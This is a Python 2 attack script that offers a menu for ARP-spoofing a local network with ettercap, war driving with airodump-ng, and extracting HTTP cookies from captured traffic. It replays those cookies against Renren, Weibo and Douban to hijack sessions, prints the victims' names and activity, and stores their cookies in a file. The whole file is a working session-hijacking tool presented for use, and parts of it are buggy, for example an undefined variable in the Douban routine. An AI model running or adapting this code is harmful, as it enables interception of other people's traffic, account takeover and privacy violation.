#!/usr/bin/python
#encoding=utf-8
import re
import os 
from time import sleep
from os import system
import urllib2
import urllib
import cookielib
selection=''
wlan_if=''
TMP_ROUTE='/tmp/tmp_route'
TMP_UNIVERSAL='/tmp/tmp_universal'
TMP_IFCONFIG='/tmp/tmp_ifocnfig'
renren_namelist=[]
weibo_namelist=[]
douban_namelist=[]
def renrenBrowser(cookie,f1):
        try:
                url="http://www.renren.com"
                cookiejar=cookielib.CookieJar()
                req = urllib2.Request(url)
                req.add_header('Cookie', cookie)
                data = urllib2.urlopen(req).read()
                name_pattern=re.compile(r'(?<=<title>人人网 - )[\S]*(?=</title>)')
                name=name_pattern.search(data).group(0)
                coming_pattern=re.compile(r'(?<=最近来访<span> )[\d]+')
                coming=coming_pattern.search(data).group(0)
                consist_pattern=re.compile(r'(?<=>)[\d]+(?=天</)')
                consist=consist_pattern.search(data).group(0)
                if len([names for names in renren_namelist if names==name])==0:
                        print('------RenRen account detected!------')
                        print('The Name is: \t'+name)
                        print('The Total view is : \t'+coming)
                        print('The Total Consist Login is : \t'+consist)
                        renren_namelist.append(name)
                        f1.write(name+'\t'+url+'\t'+cookie+'\n')
        except Exception as e:
                pass
def weiboBrowser(cookie,f1):
        try:
                url="http://www.weibo.com"
                cookiejar=cookielib.CookieJar()
                req = urllib2.Request(url)
                req.add_header('Cookie', cookie)
                data = urllib2.urlopen(req).read()
                uid_pattern=re.compile(r'(?<=\$CONFIG\[\'uid\'\] = )[\'\d]+(?=;)')
                uid=uid_pattern.search(data).group(0)
                name_pattern=re.compile(r'(?<=\$CONFIG\[\'nick\'\] = )[\S]+(?=;)')
                name=name_pattern.search(data).group(0)
                if len([names for names in weibo_namelist if names==name])==0:
                        print('++++++Weibo account Detected!++++++')
                        print('Uid is : '+uid)
                        print('Nick name is :'+name)
                        weibo_namelist.append(name)
                        f1.write(name+'\t'+url+'\t'+cookie+'\n')
        except Exception as e:
		pass
def doubanBrowser(cookie,f1):
        try:
                url="http://www.douban.com"
                cookiejar=cookielib.CookieJar()
                req = urllib2.Request(url)
                req.add_header('Cookie', cookie)
                data = urllib2.urlopen(req).read()
                print(data)
                #uid_pattern=re.compile(r'(?<=\$CONFIG\[\'uid\'\] = )[\d]+(?=;)')
                #uid=uid_pattern.search(data).group(0)
                #name_pattern=re.compile(r'(?<=\$CONFIG\[\'nick\'\] = )[\S]+(?=;)')
                #name=name_pattern.search(data).group(0)
                #print('Weibo account Detected!')
                #print('Uid is : '+uid)
                #print('Nick name is :'+name)
                f1.write(name+'\t'+url+'\t'+cookie+'\n')
        except Exception as e:
                pass

def get_gateway ( wlan_if ) :
    """ get gateway info from route comm """
    system ( "LANG=C route -n  > %s " %  TMP_ROUTE )
    if system ( "egrep '^0.0.0.0' %s | grep %s > %s" %\
            (TMP_ROUTE , wlan_if , TMP_UNIVERSAL ) ) != 0 :
        return False
    fd = open ( TMP_UNIVERSAL , "r" )
    for each_line in fd :
        gateway = re.split ( "\s+" , each_line )[1]
    fd.close ()
    system ( "rm %s 2>/dev/null " % TMP_UNIVERSAL )
    return gateway
def get_netmask ( wlan_if ) :
    """ get netmask info from ifconfig comm """
    system ( "LANG=C ifconfig %s > %s" % ( wlan_if , TMP_IFCONFIG ))
    if system ( "grep Mask %s > %s" % \
            ( TMP_IFCONFIG, TMP_UNIVERSAL ) ) != 0 :
        return False
    fd = open ( TMP_UNIVERSAL , "r" )
    for eachline in fd :
        tmp_line = re.split ( "\s+" , eachline )
        netmask = re.sub ( "Mask:" , "" , tmp_line[4] )
    fd.close ()
    system ( "rm %s 2>/dev/null " % TMP_UNIVERSAL )
    return netmask
getway=get_gateway(wlan_if)
mask=get_netmask(wlan_if)

def ARP():
	print('ARP--Local network required!')
	print('Input the interface you want to use!\n')
	interface=raw_input()
	wlan_if=interface
	gateway=get_gateway(wlan_if)
	mask=get_netmask(wlan_if)
	if gateway==False:
		print('Get Gateway Information ERRER!')
		return False
	print('gate way is : '+ gateway+'\n')
	system("echo \'1\' > /proc/sys/net/ipv4/ip_forward")
	system("ettercap -Tq -i "+interface+" -M arp:remote /"+gateway+"/ //  -w ./arp_pcap.pcap")
def WarD():
	print('War Driving ')
	print('Input the interface you want to use!\n')
        interface=raw_input()
        wlan_if=interface
	system("airmon-ng start "+interface)
	sleep(5)
	system("airodump-ng -w ./war_driving.pcap mon0")
def Pcap():
	print('Pcap --Internet connection required!')
	print('Please input the dir of pcap files (Ends with /)\n\
	 Nothing means CURRENT directory!\n')
	pcap_dir=raw_input()
	if pcap_dir=='':
		pcap_dir='./'
	system("./pcap2cookie.py")
	#filetype='cap'
	#file_list=[file_name for file_name in os.listdir(dir) if file_name.endswith(filetype)]
	#for file_name in file_list:
        #	os.system('tshark -r '+dir+file_name+' -R \'http.cookie\' -T fields -e http.host -e http.cookie >>'+dir+'result.txt')
	f=open('result.txt','r')
	f1=open('cookie_final.txt','aw')
	for line in f:
        	s=line.split('\t')
        	url=s[0]
        	cookie=s[1]
        	domain_pattern=re.compile(r'[a-zA-Z\-\d]*.com')
        	domain_group=domain_pattern.search(url)
        	if domain_group:
                	domain=domain_group.group(0)
                	if domain=='renren.com':
                        	renrenBrowser(cookie,f1)
                	if domain=='weibo.com':
                        	weiboBrowser(cookie,f1)
                	if domain=='douban.com':
                        	doubanBrowser(cookie,f1)
	f.close()
	f1.close()

while(True):	
	print('Please select Method you want to DO:\n\
		1: for ARP Spoofing \n\
		2: for WAR Driving \n\
		3: for Pcap file analysis!\n')
	selection=input()
	if selection==1:
		ARP()
		break
	if selection==2:
		WarD()
		break
	if selection==3:
		Pcap()
		break
	else:
		continue

